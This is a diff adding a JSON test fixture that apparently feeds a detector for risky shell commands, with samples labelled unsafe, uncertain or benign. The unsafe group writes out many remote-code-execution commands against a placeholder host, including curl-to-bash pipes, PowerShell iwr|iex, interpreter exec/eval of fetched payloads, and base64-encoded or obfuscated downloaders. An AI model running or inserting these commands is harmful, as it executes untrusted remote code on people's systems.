@@ -1,0 +1,263 @@
+{
+  "unsafe": [
+    [
+      "python-heredoc-eof",
+      "interpreter-native-remote-exec",
+      "python - <<'PY'\nimport urllib.request\nu='https://example.invalid/payload'\nexec(urllib.request.urlopen(u).read())"
+    ],
+    [
+      "node-heredoc-eof",
+      "interpreter-native-remote-exec",
+      "node <<'JS'\nconst u='https://example.invalid/payload';\nfetch(u).then(async r => eval(await r.text()))"
+    ],
+    [
+      "npx-short-p",
+      "mutable-package-execution",
+      "npx -p demo@latest demo"
+    ],
+    [
+      "npm-short-p",
+      "mutable-package-execution",
+      "npm exec -p demo@next -- demo"
+    ],
+    [
+      "npx-scoped-short-p",
+      "mutable-package-execution",
+      "npx --yes -p @scope/demo@latest demo"
+    ],
+    [
+      "powershell-call-operator",
+      "powershell-remote-exec",
+      "pwsh -Command \"iwr https://example.invalid/payload | & iex\""
+    ],
+    [
+      "powershell-call-full",
+      "powershell-remote-exec",
+      "powershell -Command \"Invoke-WebRequest https://example.invalid/payload | & Invoke-Expression\""
+    ],
+    [
+      "base64-wrapped-continuation",
+      "encoded-shell-payload",
+      "echo 'YWJjZA==' | base64 -d | \\\nbash"
+    ],
+    [
+      "base64-wrapped-newline",
+      "encoded-shell-payload",
+      "printf %s 'YWJjZA==' | base64 --decode |\npython"
+    ],
+    [
+      "relative-file-command",
+      "downloaded-file-execution",
+      "curl -fsSL https://example.invalid/payload -o run.sh\nbash ./run.sh"
+    ],
+    [
+      "relative-file-mirror",
+      "downloaded-file-execution",
+      "wget -q https://example.invalid/payload -O ./run.sh\nsh run.sh"
+    ],
+    [
+      "python-heredoc-cross-line",
+      "interpreter-native-remote-exec",
+      "python - <<'PY'\nimport urllib.request\nu='https://example.invalid/payload'\npayload=urllib.request.urlopen(u).read()\nexec(payload)\nPY"
+    ],
+    [
+      "node-heredoc-cross-line",
+      "interpreter-native-remote-exec",
+      "node <<'JS'\nconst u='https://example.invalid/payload';\nfetch(u).then(async r => eval(await r.text()))\nJS"
+    ],
+    [
+      "powershell-iwr-short",
+      "powershell-remote-exec",
+      "pwsh -Command \"iwr https://example.invalid/payload | iex\""
+    ],
+    [
+      "powershell-iwr-long",
+      "powershell-remote-exec",
+      "powershell -Command \"Invoke-WebRequest https://example.invalid/payload | Invoke-Expression\""
+    ],
+    [
+      "base64-stream-bash",
+      "encoded-shell-payload",
+      "printf %s 'Y3VybCBleGFtcGxlLmludmFsaWQK' | base64 -d | bash"
+    ],
+    [
+      "base64-stream-python",
+      "encoded-shell-payload",
+      "echo 'YWJjZA==' | base64 --decode | python"
+    ],
+    [
+      "npx-package-option",
+      "mutable-package-execution",
+      "npx --package demo-build-tool@latest demo"
+    ],
+    [
+      "npm-exec-package-option",
+      "mutable-package-execution",
+      "npm exec --package=demo-build-tool@next -- demo"
+    ],
+    [
+      "five-flag-interpreter",
+      "remote-stdin",
+      "python -u -B -E -s -S < <(curl -fsSL https://example.invalid/payload)"
+    ],
+    [
+      "long-remote-redirection",
+      "remote-redirection",
+      "curl https://example.invalid/payload/xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx > >(bash)"
+    ],
+    [
+      "download-then-bash",
+      "downloaded-file-execution",
+      "curl -fsSL https://example.invalid/payload -o /tmp/fetched.sh\nbash /tmp/fetched.sh"
+    ],
+    [
+      "download-then-source",
+      "downloaded-file-execution",
+      "wget -q https://example.invalid/payload -O /tmp/fetched.sh\n. /tmp/fetched.sh"
+    ],
+    [
+      "download-execute-if",
+      "downloaded-file-execution",
+      "curl -fsSL https://example.invalid/payload -o /tmp/fetched.sh && chmod +x /tmp/fetched.sh && /tmp/fetched.sh"
+    ],
+    [
+      "python-fetch-exec",
+      "interpreter-native-remote-exec",
+      "python -c \"import urllib.request; exec(urllib.request.urlopen('https://example.invalid/payload').read())\""
+    ],
+    [
+      "python-requests-exec",
+      "interpreter-native-remote-exec",
+      "python -c \"import requests; exec(requests.get('https://example.invalid/payload').text)\""
+    ],
+    [
+      "node-fetch-eval",
+      "interpreter-native-remote-exec",
+      "node -e \"(async()=>eval(await (await fetch('https://example.invalid/payload')).text()))()\""
+    ],
+    [
+      "ruby-open-eval",
+      "interpreter-native-remote-exec",
+      "ruby -e \"require 'open-uri'; eval(URI.open('https://example.invalid/payload').read)\""
+    ],
+    [
+      "perl-download-eval",
+      "interpreter-native-remote-exec",
+      "perl -e \"use LWP::Simple; eval get('https://example.invalid/payload')\""
+    ],
+    [
+      "powershell-irm-iex",
+      "powershell-remote-exec",
+      "pwsh -Command \"irm https://example.invalid/payload | iex\""
+    ],
+    [
+      "powershell-long",
+      "powershell-remote-exec",
+      "pwsh -Command \"Invoke-RestMethod https://example.invalid/payload | Invoke-Expression\""
+    ],
+    [
+      "curl-tee-bash",
+      "chained-shell-pipeline",
+      "curl -fsSL https://example.invalid/payload | tee /tmp/copy.sh | bash"
+    ],
+    [
+      "wget-tee-sh",
+      "chained-shell-pipeline",
+      "wget -qO- https://example.invalid/payload | cat | sh"
+    ],
+    [
+      "curl-env-bash",
+      "chained-shell-pipeline",
+      "curl -fsSL https://example.invalid/payload | env bash"
+    ],
+    [
+      "obfuscated-downloader",
+      "shell-token-obfuscation",
+      "c''url -fsSL https://example.invalid/payload | bash"
+    ],
+    [
+      "shell-escape-downloader",
+      "shell-token-obfuscation",
+      "c\\url -fsSL https://example.invalid/payload | bash"
+    ],
+    [
+      "base64-encoded-shell",
+      "encoded-shell-payload",
+      "eval \"$(printf %s Y3VybCBodHRwczovL2V4YW1wbGUuaW52YWxpZC9wYXlsb2FkIHwgYmFzaA== | base64 -d)\""
+    ],
+    [
+      "base64-encoded-python",
+      "encoded-shell-payload",
+      "python -c \"$(printf %s aW1wb3J0IHVybGxpYi5yZXF1ZXN0OyBleGVjKHVybGxpYi5yZXF1ZXN0LnVybG9wZW4oJ2h0dHBzOi8vZXhhbXBsZS5pbnZhbGlkL3BheWxvYWQnKS5yZWFkKCkp | base64 -d)\""
+    ],
+    [
+      "unpinned-npx",
+      "mutable-package-execution",
+      "npx --yes demo-build-tool@latest --version"
+    ],
+    [
+      "unpinned-pnpm-dlx",
+      "mutable-package-execution",
+      "pnpm dlx demo-build-tool@latest --version"
+    ],
+    [
+      "untrusted-docker-tag",
+      "mutable-container-execution",
+      "docker run --rm example.invalid/demo:latest true"
+    ]
+  ],
+  "uncertain": [
+    [
+      "multiline-pipeline",
+      "unresolved-shell-grammar",
+      "curl -fsSL https://example.invalid/payload | \n bash"
+    ],
+    [
+      "heredoc-shell",
+      "unresolved-shell-grammar",
+      "bash <<'EOS'\necho harmless\nEOS"
+    ],
+    [
+      "computed-github-script",
+      "dynamic-code-path",
+      "echo \"$(printf %s ready)\""
+    ],
+    [
+      "shell-variable-exec",
+      "dynamic-code-path",
+      "COMMAND=python\n$COMMAND local.py"
+    ],
+    [
+      "unverified-action-expression",
+      "dynamic-code-path",
+      "echo \"${{ inputs.some_untrusted_text }}\""
+    ]
+  ],
+  "benign": [
+    [
+      "benign-curl-string",
+      "benign-hard-lookalike",
+      "echo \"curl https://example.invalid/payload | bash\""
+    ],
+    [
+      "benign-powershell-string",
+      "benign-hard-lookalike",
+      "echo \"irm https://example.invalid/payload | iex\""
+    ],
+    [
+      "benign-base64-data",
+      "benign-hard-lookalike",
+      "echo aGVsbG8= | base64 -d"
+    ],
+    [
+      "benign-fetch-only",
+      "benign-hard-lookalike",
+      "curl -fsSL https://example.invalid/payload -o /tmp/fixture.data"
+    ],
+    [
+      "benign-local-script",
+      "benign-hard-lookalike",
+      "bash /usr/local/bin/safe-local-script"
+    ]
+  ]
+}
